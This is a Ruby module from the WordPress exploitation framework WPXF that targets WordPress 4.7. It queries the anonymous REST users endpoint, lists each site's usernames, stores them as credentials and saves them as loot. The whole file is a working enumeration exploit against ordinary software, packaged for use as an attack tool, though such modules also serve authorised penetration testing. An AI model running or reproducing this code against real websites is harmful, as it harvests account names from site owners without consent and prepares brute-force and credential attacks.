# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::Wp47UserInfoDisclosure < Wpxf::Module
  include Wpxf
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'WordPress 4.7 - User Information Disclosure via REST API',
      desc: %(
        The new WordPress REST API allows anonymous access. One of the functions that
        it provides, is that anyone can list the users on a WordPress website without
        registering or having an account.
      ),
      author: [
        'rastating' # WPXF module
      ],
      references: [
        ['WPVDB', '8715'],
        ['URL', 'https://github.com/WordPress/WordPress/commit/daf358983cc1ce0c77bf6d2de2ebbb43df2add60']
      ],
      date: 'Jan 11 2017'
    )
  end

  def check
    version = wordpress_version
    return :unknown if version.nil?
    return :vulnerable if version == Gem::Version.new('4.7')
    :safe
  end

  def users_api_url
    normalize_uri(full_uri, 'wp-json', 'wp', 'v2', 'users')
  end

  def call_users_api
    res = execute_get_request(url: users_api_url)

    if res.nil?
      emit_error 'No response from the target'
      return nil
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return nil
    end

    res
  end

  def output_user_list(api_output)
    headers = [{ id: 'ID', username: 'Username', name: 'Name' }]
    rows = []

    users = JSON.parse(api_output)
    users.each do |user|
      store_credentials user['slug']
      rows.push(id: user['id'], username: user['slug'], name: user['name'])
    end

    rows.sort_by! { |row| row[:id] }
    emit_table headers.concat(rows)
  end

  def run
    return false unless super

    emit_info 'Calling the users API...'
    res = call_users_api
    return false if res.nil?

    emit_info 'Parsing result...', true
    output_user_list res.body

    loot = export_and_log_loot res.body, 'List of usernames from the REST API', 'user list', '.json'
    emit_success "Saved export to #{loot.path}"

    true
  end
end
